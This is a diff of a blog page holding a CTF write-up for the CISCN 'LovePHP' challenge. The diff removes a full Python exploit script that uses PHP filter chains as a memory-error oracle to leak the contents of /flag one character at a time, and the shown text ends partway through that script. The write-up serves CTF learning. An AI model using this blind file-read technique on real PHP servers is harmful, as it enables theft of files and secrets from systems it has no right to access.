@@ -1,13 +1,13 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ciscn初赛——LovePHP题目wp | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ciscn初赛——LovePHP题目wp   PHP特性题目    引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击    import requests   import sys   from base64 import b64decode      &quot;&quot;&quot;   THE GRAND IDEA:   We can use PHP memory lim">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ciscn初赛——LovePHP题目wp | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ciscn初赛——LovePHP题目wp   PHP特性题目  引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击   import requests import sys from base64 import b64decode  &quot;&quot;&quot; THE GRAND IDEA: We can use PHP memory limit as an error oracle. Repeate">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ciscn初赛——LovePHP题目wp">
 <meta property="og:url" content="http://dezhoutorizhao.github.io/LovePHP/index.html">
 <meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
-<meta property="og:description" content="Ciscn初赛——LovePHP题目wp   PHP特性题目    引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击    import requests   import sys   from base64 import b64decode      &quot;&quot;&quot;   THE GRAND IDEA:   We can use PHP memory lim">
+<meta property="og:description" content="Ciscn初赛——LovePHP题目wp   PHP特性题目  引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击   import requests import sys from base64 import b64decode  &quot;&quot;&quot; THE GRAND IDEA: We can use PHP memory limit as an error oracle. Repeate">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
 <meta property="article:published_time" content="2023-08-27T09:05:19.259Z">
-<meta property="article:modified_time" content="2024-02-13T14:30:09.808Z">
+<meta property="article:modified_time" content="2024-04-11T07:32:51.327Z">
 <meta property="article:author" content="h3110w0r1d">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -56,7 +56,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-02-13 22:30:09'
+  postUpdate: '2024-04-11 15:32:51'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -174,420 +174,417 @@
     document.addEventListener('pjax:send', () => { preloader.initLoading() })
     document.addEventListener('pjax:complete', () => { preloader.endLoading() })
   }
-})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ciscn初赛——LovePHP题目wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-27T09:05:19.259Z" title="发表于 2023-08-27 17:05:19">2023-08-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-13T14:30:09.808Z" title="更新于 2024-02-13 22:30:09">2024-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ciscn初赛——LovePHP题目wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Ciscn初赛——LovePHP题目wp"><a href="#Ciscn初赛——LovePHP题目wp" class="headerlink" title="Ciscn初赛——LovePHP题目wp"></a>Ciscn初赛——LovePHP题目wp</h1><ol>
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">101</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ciscn初赛——LovePHP题目wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-27T09:05:19.259Z" title="发表于 2023-08-27 17:05:19">2023-08-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-11T07:32:51.327Z" title="更新于 2024-04-11 15:32:51">2024-04-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ciscn初赛——LovePHP题目wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Ciscn初赛——LovePHP题目wp"><a href="#Ciscn初赛——LovePHP题目wp" class="headerlink" title="Ciscn初赛——LovePHP题目wp"></a>Ciscn初赛——LovePHP题目wp</h1><ol>
 <li><p>  PHP特性题目</p>
 </li>
-<li><p>  引发服务器500错误，观察PHP过滤器的行为，创建过滤器链进行攻击</p>
-</li>
-<li><pre><code class="python">  import requests
-  import sys
-  from base64 import b64decode
-  
-  &quot;&quot;&quot;
-  THE GRAND IDEA:
-  We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
-  filter will blow up the string length by 4x every time it is used, which will quickly cause
-  500 error if and only if the string is non empty. So we now have an oracle that tells us if
-  the string is empty.
-  
-  THE GRAND IDEA 2:
-  The dechunk filter is interesting.
-  https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
-  It looks like it was implemented for something http related, but for our purposes, the interesting
-  behavior is that if the string contains no newlines, it will wipe the entire string if and only if
-  the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
-  above oracle! In fact we can verify that since the flag starts with D that the filter chain
-  
-  dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
-  
-  does not cause a 500 error.
-  
-  THE REST:
-  So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
-  into madness trying to figure out ways to:
-  - somehow get other characters not at the start of the flag file to the front
-  - detect more precisely which character is at the front
-  &quot;&quot;&quot;
-  
-  def join(*x):
-      return &#39;|&#39;.join(x)
-  
-  def err(s):
-      print(s)
-      raise ValueError
-  
-  def req(s):
-      param = &#39;&#123;&#125;&#39;
-      data = f&#39;&#123;param&#125;&amp;secret=php://filter/&#123;s&#125;/resource=/flag&#39;
-  
-      return requests.get(f&#39;http://IP+PORT/index.php?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;data&#125;&#39;).status_code == 500
-  
-  &quot;&quot;&quot;
-  Step 1:
-  The second step of our exploit only works under two conditions:
-  - String only contains a-zA-Z0-9
-  - String ends with two equals signs
-  
-  base64-encoding the flag file twice takes care of the first condition.
-  
-  We don&#39;t know the length of the flag file, so we can&#39;t be sure that it will end with two equals
-  signs.
-  
-  Repeated application of the convert.quoted-printable-encode will only consume additional
-  memory if the base64 ends with equals signs, so that&#39;s what we are going to use as an oracle here.
-  If the double-base64 does not end with two equals signs, we will add junk data to the start of the
-  flag with convert.iconv..CSISO2022KR until it does.
-  &quot;&quot;&quot;
-  
-  blow_up_enc = join(*[&#39;convert.quoted-printable-encode&#39;]*1000)
-  blow_up_utf32 = &#39;convert.iconv.L1.UCS-4LE&#39;
-  blow_up_inf = join(*[blow_up_utf32]*50)
-  
-  header = &#39;convert.base64-encode|convert.base64-encode&#39;
-  
-  # Start get baseline blowup
-  print(&#39;Calculating blowup&#39;)
-  baseline_blowup = 0
-  for n in range(100):
-      payload = join(*[blow_up_utf32]*n)
-      if req(f&#39;&#123;header&#125;|&#123;payload&#125;&#39;):
-          baseline_blowup = n
-          break
-  else:
-      err(&#39;something wrong&#39;)
-  
-  print(f&#39;baseline blowup is &#123;baseline_blowup&#125;&#39;)
-  
-  trailer = join(*[blow_up_utf32]*(baseline_blowup-1))
-  
-  assert req(f&#39;&#123;header&#125;|&#123;trailer&#125;&#39;) == False
-  
-  print(&#39;detecting equals&#39;)
-  j = [
-      req(f&#39;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
-      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
-      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;)
-  ]
-  print(j)
-  if sum(j) != 2:
-      err(&#39;something wrong&#39;)
-  if j[0] == False:
-      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;
-  elif j[1] == False:
-      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#39;
-  elif j[2] == False:
-      header = f&#39;convert.base64-encode|convert.base64-encode&#39;
-  else:
-      err(&#39;something wrong&#39;)
-  print(f&#39;j: &#123;j&#125;&#39;)
-  print(f&#39;header: &#123;header&#125;&#39;)
-  
-  &quot;&quot;&quot;
-  Step two:
-  Now we have something of the form
-  [a-zA-Z0-9 things]==
-  
-  Here the pain begins. For a long time I was trying to find something that would allow me to strip
-  successive characters from the start of the string to access every character. Maybe something like
-  that exists but I couldn&#39;t find it. However, if you play around with filter combinations you notice
-  there are filters that *swap* characters:
-  
-  convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
-  abcdefgh -&gt; badcfehg
-  
-  convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
-  abcdefgh -&gt; dcbahgfe
-  
-  This allows us to access the first four characters of the string. Can we do better? It turns out
-  YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
-  the string:
-  
-  abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh
-  
-  The idea being that if we now use the r4 gadget, we get something like:
-  ba&lt;0xfe&gt;&lt;0xff&gt;fedc
-  
-  And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
-  &lt;0xfe&gt;&lt;0xff&gt; to get:
-  bafedc
-  
-  And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
-  characters of the string. There&#39;s only one problem: our r4 gadget requires that the string length
-  is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
-  we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
-  good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
-  turns out, if we apply the filter
-  convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
-  
-  It will turn the == into:
-  +---AD0-3D3D+---AD0-3D3D
-  
-  And this is magic, because this corrects such that when we apply the
-  convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
-  
-  Let&#39;s recap. We have a string like:
-  abcdefghij==
-  
-  Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
-  abcdefghij+---AD0-3D3D+---AD0-3D3D
-  
-  Apply convert.iconv.CSUNICODE.CSUNICODE:
-  &lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D
-  
-  Apply r4 gadget:
-  ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3
-  
-  Apply base64-decode | base64-encode, so the &#39;-&#39; and high bytes will disappear:
-  bafedcjihg+0DAD3D3+0DAD3Dw==
-  
-  Then apply r4 once more:
-  efabijcd0+gh3DAD0+3D3DAD==wD
-  
-  And here&#39;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but
-  the string still has two equals signs in it, so we can reapply the technique as many times as we
-  want, to access all the characters in the string ;)
-  &quot;&quot;&quot;
-  
-  flip = &quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;
-  r2 = &quot;convert.iconv.CSUNICODE.UCS-2BE&quot;
-  r4 = &quot;convert.iconv.UCS-4LE.10646-1:1993&quot;
-  
-  def get_nth(n):
-      global flip, r2, r4
-      o = []
-      chunk = n // 2
-      if chunk % 2 == 1: o.append(r4)
-      o.extend([flip, r4] * (chunk // 2))
-      if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
-      return join(*o)
-  
-  &quot;&quot;&quot;
-  Step 3:
-  This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
-  char is 0-9A-Fa-f. So it&#39;s just a matter of finding filters which translate to or from those
-  chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
-  I just bruteforced every combination of iconv filters to find these.
-  
-  Numbers are a bit trickier because iconv doesn&#39;t tend to touch them.
-  In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
-  want a full leak you can base64 encode a third time and use the first two letters of the resulting
-  string to figure out which number it is.
-  &quot;&quot;&quot;
-  
-  rot1 = &#39;convert.iconv.437.CP930&#39;
-  be = &#39;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#39;
-  o = &#39;&#39;
-  
-  def find_letter(prefix):
-      if not req(f&#39;&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # a-f A-F 0-9
-          if not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # a-e
-              for n in range(5):
-                  if req(f&#39;&#123;prefix&#125;|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-                      return &#39;edcba&#39;[n]
-                      break
-              else:
-                  err(&#39;something wrong&#39;)
-          elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # A-E
-              for n in range(5):
-                  if req(f&#39;&#123;prefix&#125;|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-                      return &#39;EDCBA&#39;[n]
-                      break
-              else:
-                  err(&#39;something wrong&#39;)
-          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;*&#39;
-          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # f
-              return &#39;f&#39;
-          elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # F
-              return &#39;F&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # n-s N-S
-          if not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # n-r
-              for n in range(5):
-                  if req(f&#39;&#123;prefix&#125;|string.rot13|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-                      return &#39;rqpon&#39;[n]
-                      break
-              else:
-                  err(&#39;something wrong&#39;)
-          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # N-R
-              for n in range(5):
-                  if req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-                      return &#39;RQPON&#39;[n]
-                      break
-              else:
-                  err(&#39;something wrong&#39;)
-          elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # s
-              return &#39;s&#39;
-          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-              # S
-              return &#39;S&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # i j k
-          if req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;k&#39;
-          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;j&#39;
-          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;i&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # I J K
-          if req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;K&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;J&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;I&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # v w x
-          if req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;x&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;w&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;v&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # V W X
-          if req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;X&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;W&#39;
-          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
-              return &#39;V&#39;
-          else:
-              err(&#39;something wrong&#39;)
-      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # Z
-          return &#39;Z&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # z
-          return &#39;z&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # M
-          return &#39;M&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # m
-          return &#39;m&#39;
-      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # y
-          return &#39;y&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # Y
-          return &#39;Y&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # l
-          return &#39;l&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # L
-          return &#39;L&#39;
-      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # h
-          return &#39;h&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # H
-          return &#39;H&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # u
-          return &#39;u&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # U
-          return &#39;U&#39;
-      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # g
-          return &#39;g&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # G
-          return &#39;G&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # t
-          return &#39;t&#39;
-      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
-          # T
-          return &#39;T&#39;
-      else:
-          err(&#39;something wrong&#39;)
-  
-  print()
-  for i in range(100):
-      prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;&#39;
-      letter = find_letter(prefix)
-      # it&#39;s a number! check base64
-      if letter == &#39;*&#39;:
-          prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode&#39;
-          s = find_letter(prefix)
-          if s == &#39;M&#39;:
-              # 0 - 3
-              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
-              ss = find_letter(prefix)
-              if ss in &#39;CDEFGH&#39;:
-                  letter = &#39;0&#39;
-              elif ss in &#39;STUVWX&#39;:
-                  letter = &#39;1&#39;
-              elif ss in &#39;ijklmn&#39;:
-                  letter = &#39;2&#39;
-              elif ss in &#39;yz*&#39;:
-                  letter = &#39;3&#39;
-              else:
